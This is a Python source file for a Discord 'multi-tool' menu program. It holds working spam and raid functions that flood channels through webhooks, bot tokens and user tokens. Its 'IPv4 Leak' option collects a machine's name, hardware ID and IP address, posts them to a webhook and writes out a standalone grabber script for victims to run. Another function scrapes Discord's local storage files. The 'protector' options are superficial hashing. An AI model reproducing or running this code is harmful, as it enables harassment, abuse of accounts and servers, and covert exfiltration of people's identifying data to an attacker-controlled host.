import time
import requests
import subprocess
import platform
import os
import random
import string
from colorama import init, Fore
import hashlib

class DiscordTool:
    def __init__(self):
        init(autoreset=True)

    def main(self):
        while True:
            self.clear_screen()
            self.display_ascii_art()

            # Display main menu options
            print(Fore.MAGENTA + "1. Webhook Sender")
            print(Fore.MAGENTA + "2. Token Sender")
            print(Fore.MAGENTA + "3. Token Joiner")
            print(Fore.MAGENTA + "4. Token Spammer")
            print(Fore.MAGENTA + "5. IPv4 Leak")
            print(Fore.MAGENTA + "6. Token Protector")
            print(Fore.MAGENTA + "7. Email Protector")
            print(Fore.MAGENTA + "8. Password Protector")
            print(Fore.MAGENTA + "9. Discord Webhook Finder")

            # Prompt user for choice
            choice = input(Fore.MAGENTA + "Choose an option (1-9): ")

            # Process user choice
            if choice == '1':
                self.webhook_sender_func()
            elif choice == '2':
                self.token_sender_func()
            elif choice == '3':
                self.token_joiner_func()
            elif choice == '4':
                self.token_spammer_func()
            elif choice == '5':
                self.ipv4_leak_func()
            elif choice == '6':
                self.token_protector_func()
            elif choice == '7':
                self.email_protector_func()
            elif choice == '8':
                self.password_protector_func()
            elif choice == '9':
                self.discord_webhook_finder_func()
            else:
                print(Fore.RED + "Invalid option. Please enter a number from 1 to 9.")

            input("Press Enter to continue...")

    def display_ascii_art(self):
        print(Fore.CYAN + r"""
 _____ ______   ________  ___       ________  ___  __    ________     
|\   _ \  _   \|\   __  \|\  \     |\   __  \|\  \|\  \ |\   __  \    
\ \  \\\__\ \  \ \  \|\  \ \  \    \ \  \|\  \ \  \/  /|\ \  \|\  \   
 \ \  \\|__| \  \ \   __  \ \  \    \ \   __  \ \   ___  \ \   __  \  
  \ \  \    \ \  \ \  \ \  \ \  \____\ \  \ \  \ \  \\ \  \ \  \ \  \ 
   \ \__\    \ \__\ \__\ \__\ \_______\ \__\ \__\ \__\\ \__\ \__\ \__\
    \|__|     \|__|\|__|\|__|\|_______|\|__|\|__|\|__| \|__|\|__|\|__|
                                                                       """)

    def webhook_sender_func(self):
        self.clear_screen()
        print(Fore.MAGENTA + "You are in the Webhook Sender function")

        webhook_url = input("Enter Webhook URL: ")
        message = input("Enter Message: ")
        num_times = int(input("Enter Number of Times: "))
        delay = int(input("Enter Delay in Seconds: "))

        for i in range(num_times):
            requests.post(webhook_url, json={"content": message})
            time.sleep(delay)

        self.wait_for_return()

    def token_sender_func(self):
        self.clear_screen()
        print(Fore.MAGENTA + "You are in the Token Sender function")

        bot_token = input("Enter Bot Token: ")
        guild_id = input("Enter Guild ID: ")
        num_channels = int(input("Enter Number of Channels to Create: "))
        message = input("Enter Message: ")
        num_times = int(input("Enter Number of Times to Send Message: "))
        delay = int(input("Enter Delay in Seconds: "))

        headers = {
            "Authorization": f"Bot {bot_token}",
            "Content-Type": "application/json"
        }

        try:
            for _ in range(num_channels):
                channel_data = {
                    "name": f"channel-{time.time()}"
                }
                response = requests.post(f"https://discord.com/api/v9/guilds/{guild_id}/channels", headers=headers,
                                         json=channel_data)
                if response.status_code == 201:
                    channel_id = response.json().get("id")
                    for _ in range(num_times):
                        requests.post(f"https://discord.com/api/v9/channels/{channel_id}/messages", headers=headers,
                                      json={"content": message})
                        time.sleep(delay)
                else:
                    print("Failed to create channel.")
        except Exception as e:
            print(Fore.RED + f"Error: {e}")

        self.wait_for_return()

    def token_joiner_func(self):
        self.clear_screen()
        print(Fore.MAGENTA + "You are in the Token Joiner function")

        token = input("Enter User Token: ")
        server_invite = input("Enter Server Invite Link: ")

        headers = {
            "Authorization": token
        }

        response = requests.post(server_invite, headers=headers)
        if response.status_code == 200:
            print("Successfully joined the server.")
        else:
            print("Failed to join the server.")

        self.wait_for_return()

    def token_spammer_func(self):
        self.clear_screen()
        print(Fore.MAGENTA + "You are in the Token Spammer function")

        token = input("Enter User Token: ")
        channel_id = input("Enter Channel ID: ")
        message = input("Enter Message: ")
        num_times = int(input("Enter Number of Times to Send Message: "))
        delay = int(input("Enter Delay in Seconds: "))

        headers = {
            "Authorization": token
        }

        for i in range(num_times):
            requests.post(f"https://discord.com/api/v9/channels/{channel_id}/messages", headers=headers,
                          json={"content": message})
            time.sleep(delay)

        self.wait_for_return()

    def ipv4_leak_func(self):
        self.clear_screen()
        print(Fore.MAGENTA + "You are in the IPv4 Leak function")

        webhook_url = input("Enter Webhook URL: ")
        include_info = input("Include PC Name, HWID, and IPv4? (y/n): ")

        if include_info.lower() == 'y':
            pc_name = platform.node()
            hwid = subprocess.check_output('wmic csproduct get uuid').decode().split('\n')[1].strip()

            # Retrieve IPv4 address using ipconfig command
            ipconfig_output = subprocess.check_output('ipconfig').decode()
            ipv4 = [line.split(':')[-1].strip() for line in ipconfig_output.split('\n') if 'IPv4 Address' in line]
            if ipv4:
                ipv4 = ipv4[0]
            else:
                ipv4 = "IPv4 address not found"

            message = f"PC Name: {pc_name}\nHWID: {hwid}\nIPv4: {ipv4}"
            requests.post(webhook_url, json={"content": message})

            # Write the Python script to a file
            script_content = f'''
import requests
import subprocess
import platform
import time
import os

webhook_url = "{webhook_url}"
pc_name = platform.node()
hwid = subprocess.check_output('wmic csproduct get uuid').decode().split('\\n')[1].strip()

# Retrieve IPv4 address using ipconfig command
ipconfig_output = subprocess.check_output('ipconfig').decode()
ipv4 = [line.split(':')[-1].strip() for line in ipconfig_output.split('\\n') if 'IPv4 Address' in line]
if ipv4:
    ipv4 = ipv4[0]
else:
    ipv4 = "IPv4 address not found"

message = f"PC Name: {{pc_name}}\\nHWID: {{hwid}}\\nIPv4: {{ipv4}}"
requests.post(webhook_url, json={{"content": message}})
'''

            with open("ipv4_leak_script.py", "w") as file:
                file.write(script_content)

            print("Python script created successfully.")
        else:
            requests.post(webhook_url, json={"content": "No information included."})

        self.wait_for_return()

    def token_protector_func(self):
        self.clear_screen()
        print(Fore.MAGENTA + "You are in the Token Protector function")

        token = input("Enter Discord Token: ")
        protected_token = self.protect_token(token)

        print(Fore.GREEN + f"Protected Token: {protected_token}")

        self.wait_for_return()

    def protect_token(self, token):
        return hashlib.sha256(token.encode()).hexdigest()

    def email_protector_func(self):
        self.clear_screen()
        print(Fore.MAGENTA + "You are in the Email Protector function")

        email = input("Enter Email Address: ")
        protected_email = self.protect_email(email)

        print(Fore.GREEN + f"Protected Email: {protected_email}")

        self.wait_for_return()

    def protect_email(self, email):
        return hashlib.sha256(email.encode()).hexdigest()

    def password_protector_func(self):
        self.clear_screen()
        print(Fore.MAGENTA + "You are in the Password Protector function")

        password = input("Enter Password: ")
        if self.check_weak_password(password):
            print(Fore.RED + "Weak Password Detected!")
            change_password = input("Do you want to change to a strong one? (y/n): ")
            if change_password.lower() == 'y':
                strong_password = self.generate_strong_password()
                print(Fore.GREEN + f"Password changed to: {strong_password}")
        else:
            print(Fore.GREEN + "Strong Password Detected!")

        self.wait_for_return()

    def check_weak_password(self, password):
        # Example: Check if the password length is less than 8 characters
        return len(password) < 8

    def generate_strong_password(self):
        # Example: Generate a random strong password
        characters = string.ascii_letters + string.digits + string.punctuation
        return ''.join(random.choices(characters, k=12))

    def discord_webhook_finder_func(self):
        self.clear_screen()
        print(Fore.MAGENTA + "You are in the Discord Webhook Finder function")
        webhooks = self.find_discord_webhooks()
        if webhooks:
            print(Fore.GREEN + "Found Discord Webhooks:")
            for webhook in webhooks:
                print(webhook)
        else:
            print(Fore.RED + "No Discord Webhooks found.")

        self.wait_for_return()

    def find_discord_webhooks(self):
        webhooks = []
        try:
            # Check for Discord webhook URLs in the user's directories
            path = ''
            if platform.system() == 'Windows':
                path = os.path.join(os.getenv('APPDATA'), 'discord', 'Local Storage', 'leveldb')
            elif platform.system() == 'Linux':
                path = os.path.join(os.getenv('HOME'), '.config', 'discord', 'Local Storage', 'leveldb')
            elif platform.system() == 'Darwin':
                path = os.path.join(os.getenv('HOME'), 'Library', 'Application Support', 'discord', 'Local Storage', 'leveldb')

            if os.path.exists(path):
                database_files = [f for f in os.listdir(path) if f.endswith('.ldb') or f.endswith('.log')]
                for file in database_files:
                    database = os.path.join(path, file)
                    output = subprocess.check_output(['strings', database], stderr=subprocess.STDOUT).decode()
                    webhooks.extend([line for line in output.split('\n') if 'https://discord.com/api/webhooks/' in line])
        except Exception as e:
            print(Fore.RED + f"Error finding Discord webhooks: {e}")
        return webhooks

    def clear_screen(self):
        os.system('cls' if os.name == 'nt' else 'clear')

    def wait_for_return(self):
        print(Fore.GREEN + "\nPress Enter to return to the main menu.")
        while True:
            if input() == "":
                break


if __name__ == '__main__':
    app = DiscordTool()
    app.main()
    input("Press Enter to exit...")
